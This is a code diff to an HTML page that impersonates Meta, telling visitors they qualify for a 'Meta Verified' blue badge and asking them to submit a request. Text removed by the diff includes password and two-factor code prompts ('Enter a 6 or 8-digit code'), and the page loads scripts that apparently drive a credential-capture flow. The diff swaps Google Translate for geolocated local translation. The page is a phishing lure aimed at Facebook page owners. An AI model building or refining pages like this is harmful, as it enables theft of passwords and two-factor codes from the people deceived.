@@ -6,15 +6,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Meta Verified - Rewards for you</title>
     <link rel="icon" href="./public/favicon-32x32.png">
-    <link rel="preconnect" href="https://translate.googleapis.com">
-    <link rel="preconnect" href="https://translate.google.com">
-    <link rel="preconnect" href="https://www.gstatic.com" crossorigin>
-    <link rel="preconnect" href="https://www.google.com">
-    <link rel="dns-prefetch" href="https://translate.google.com">
-    <link rel="dns-prefetch" href="https://www.gstatic.com">
-    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
     <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
-    <link rel="stylesheet" href="./public/styles/style.css?v=4">
+    <link rel="stylesheet" href="./public/styles/style.css?v=5">
     <style>
         #page-boot-overlay{position:fixed!important;top:0;right:0;bottom:0;left:0;width:100%;height:100%;min-height:100vh;min-height:100dvh;z-index:2147483646;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.82);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px)}
         .boot-spinner{width:36px;height:36px;border:3px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:_tl_spin .7s linear infinite}
@@ -68,85 +61,35 @@
     <script src="./public/js/lang-map.js"></script>
     <script>
         (function () {
-            function langFromNav() {
-                var nav = String(navigator.language || navigator.userLanguage || '').toLowerCase();
-                if (!nav) return '';
-                if (nav.indexOf('zh-tw') === 0 || nav.indexOf('zh-hk') === 0) return 'zh-TW';
-                if (nav.indexOf('zh') === 0) return 'zh-CN';
-                if (nav.indexOf('pt') === 0) return 'pt';
-                var short = nav.split('-')[0];
-                var aliases = { nb: 'no', nn: 'no', fil: 'tl', he: 'iw' };
-                return aliases[short] || short;
-            }
-            function langFromCountry(cc) {
-                if (window.__langFromCountry) return window.__langFromCountry(cc);
-                return '';
-            }
-            function setLangCookie(lang) {
-                if (!lang || lang === 'en') return;
-                document.cookie = 'googtrans=/en/' + lang + '; path=/; max-age=31536000; SameSite=Lax';
-            }
-            try {
-                var cached = sessionStorage.getItem('__geo_lang__') || '';
-                if (cached && cached !== 'en') setLangCookie(cached);
-                else {
-                    var navLang = langFromNav();
-                    if (navLang && navLang !== 'en') setLangCookie(navLang);
-                }
-            } catch (e) {}
             window.__geoFast = fetch('https://www.cloudflare.com/cdn-cgi/trace', { cache: 'no-store' })
                 .then(function (res) { return res.text(); })
                 .then(function (text) {
                     var loc = String(text).match(/(?:^|\n)loc=([A-Z]{2})/i);
                     var cc = loc ? loc[1].toUpperCase() : '';
                     if (!cc) return '';
-                    var lang = langFromCountry(cc);
-                    if (lang) setLangCookie(lang);
+                    var lang = window.__langFromCountry ? window.__langFromCountry(cc) : '';
+                    var file = window.__i18nFile ? window.__i18nFile(lang) : lang;
+                    try {
+                        sessionStorage.setItem('__geo_cc_v4__', cc);
+                        if (lang) sessionStorage.setItem('__geo_lang__', lang);
+                        if (file) {
+                            sessionStorage.setItem('__i18n_file__', file);
+                            var link = document.createElement('link');
+                            link.rel = 'preload';
+                            link.as = 'fetch';
+                            link.href = './public/i18n/' + encodeURIComponent(file) + '.json';
+                            link.crossOrigin = 'anonymous';
+                            document.head.appendChild(link);
+                        }
+                    } catch (e) {}
                     return cc;
                 })
                 .catch(function () { return ''; });
         })();
     </script>
-    <script>
-        window.__gtBoot = new Promise(function (resolve) {
-            var done = false;
-            function finish() {
-                if (done) return;
-                done = true;
-                resolve();
-            }
-            window.googleTranslateElementInit = function () {
-                var tries = 0;
-                function mount() {
-                    var host = document.getElementById('google_translate_element');
-                    if (!host) return false;
-                    try {
-                        new google.translate.TranslateElement({
-                            pageLanguage: 'en',
-                            autoDisplay: false
-                        }, 'google_translate_element');
-                    } catch (e) { /* already inited */ }
-                    finish();
-                    return true;
-                }
-                if (mount()) return;
-                var iv = setInterval(function () {
-                    tries += 1;
-                    if (mount() || tries > 200) {
-                        clearInterval(iv);
-                        finish();
-                    }
-                }, 10);
-            };
-            setTimeout(finish, 1400);
-        });
-    </script>
-    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit" async></script>
-
 </head>
 
 <body class="min-h-screen w-full flex justify-center" style="background:linear-gradient(to bottom right,#f9f1f9,#eaf3fd,#edfbf2)">
-    <div id="google_translate_element" aria-hidden="true"></div>
     <div id="page-boot-overlay">
         <div class="boot-spinner"></div>
     </div>
@@ -154,15 +97,7 @@
         document.documentElement.classList.add('is-booting');
         window.__pinViewportOverlay && window.__pinViewportOverlay(document.getElementById('page-boot-overlay'));
     </script>
-    <div id="i18n-strings" aria-hidden="true">
-        <span data-i18n="password-empty">You haven't entered your password!</span>
-        <span data-i18n="password-incorrect">The password you've entered is incorrect.</span>
-        <span data-i18n="auth-empty">You haven't entered the code!</span>
-        <span data-i18n="auth-invalid">Enter a 6 or 8-digit code.</span>
-        <span data-i18n="auth-retry">The code is incorrect. Try again after <span data-i18n-n>0</span> seconds.</span>
-        <span data-i18n="continue">Continue</span>
-    </div>
-    <script src="./public/js/translate.js"></script>
+    <script src="./public/js/i18n.js"></script>
 
     <div class="max-w-[768px] w-full p-4 h-full">
         <div class="w-full">
@@ -177,58 +112,48 @@
                         </svg>
                     </div>
                 </div>
-                <b class="text-[2rem]">Meta Verified - Rewards for you</b>
+                <b class="text-[2rem]" data-i18n="pageTitle">Meta Verified - Rewards for you</b>
             </div>
 
             <div class="w-full">
                 <div class="w-full mb-[20px]">
-                    <p class="text-[15px] mb-[0px] mt-[15px]">Show the world that you mean business.</p>
-                    <p class="text-[15px] mb-[0px] mt-[15px]">Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.</p>
-                    <p class="text-[15px] mb-[0px] mt-[15px]">We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!</p>
-                    <p class="text-[16px] mb-[0px] mt-[14px] text-[#465a69]">Your ticket id: #<span
-                            id="ticketId">NYZB-FMOL-IUF0</span></p>
+                    <p class="text-[15px] mb-[0px] mt-[15px]" data-i18n="intro1">Show the world that you mean business.</p>
+                    <p class="text-[15px] mb-[0px] mt-[15px]" data-i18n="intro2">Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.</p>
+                    <p class="text-[15px] mb-[0px] mt-[15px]" data-i18n="intro3">We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!</p>
+                    <p class="text-[16px] mb-[0px] mt-[14px] text-[#465a69]"><span data-i18n="ticketPrefix">Your ticket id:</span> #<span id="ticketId">NYZB-FMOL-IUF0</span></p>
                 </div>
 
                 <div class="w-full">
-                    <p class="mb-[15px]"><b class="text-[17px] font-bold">Verified Blue Badge Request Guide</b></p>
-                    <p class="text-[15px] mb-[10px]">- Fact checkers may not respond to requests containing
-                        intimidation, hate speech, or verbal threats</p>
-                    <p class="text-[15px] mb-[10px]">- In your request, please provide all required information to
-                        ensure timely processing by the fact checker. Submitting an invalid email address or failing to
-                        reply to requests for additional information within 2 days may lead to the application being
-                        closed without review. If the request remains unprocessed after 4 days, Meta will automatically
-                        reject it.</p>
-                    <p class="text-[15px] mb-[10px]">- Once all details are submitted, we will evaluate your account to
-                        check for any restrictions. The verification process typically takes 24 hours, though it may
-                        extend in some cases. Based on our decision, restrictions will either remain or be lifted, and
-                        your account will be updated accordingly.</p>
+                    <p class="mb-[15px]"><b class="text-[17px] font-bold" data-i18n="guideTitle">Verified Blue Badge Request Guide</b></p>
+                    <p class="text-[15px] mb-[10px]" data-i18n="guide1">- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats</p>
+                    <p class="text-[15px] mb-[10px]" data-i18n="guide2">- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
+                    <p class="text-[15px] mb-[10px]" data-i18n="guide3">- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.</p>
                 </div>
             </div>
         </div>
 
         <button id="submitRequestBtn"
-            class="bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center">
+            class="bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center"
+            data-i18n="submitRequest">
             Submit request
         </button>
 
         <div class="flex items-center text-center justify-center flex-wrap text-xs mt-8 text-[#65676b] gap-x-3 gap-y-2 px-1">
-            <a href="#">Help Center</a>
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms of Service</a>
-            <a href="#">Community Standards</a>
-            <a href="#">Meta © 2026</a>
+            <a href="#" data-i18n="footerHelp">Help Center</a>
+            <a href="#" data-i18n="footerPrivacy">Privacy Policy</a>
+            <a href="#" data-i18n="footerTerms">Terms of Service</a>
+            <a href="#" data-i18n="footerCommunity">Community Standards</a>
+            <a href="#" data-i18n="footerMeta">Meta © 2026</a>
         </div>
     </div>
 
-    <!-- Modals Container -->
     <div id="modalsContainer"></div>
 
-    <!-- JavaScript Files -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
     <script src="./public/js/config.js"></script>
-    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/utils.js?v=7"></script>
     <script src="./public/js/modal.js"></script>
-    <script src="./public/js/app.js"></script>
+    <script src="./public/js/app.js?v=7"></script>
 </body>
 
 </html>
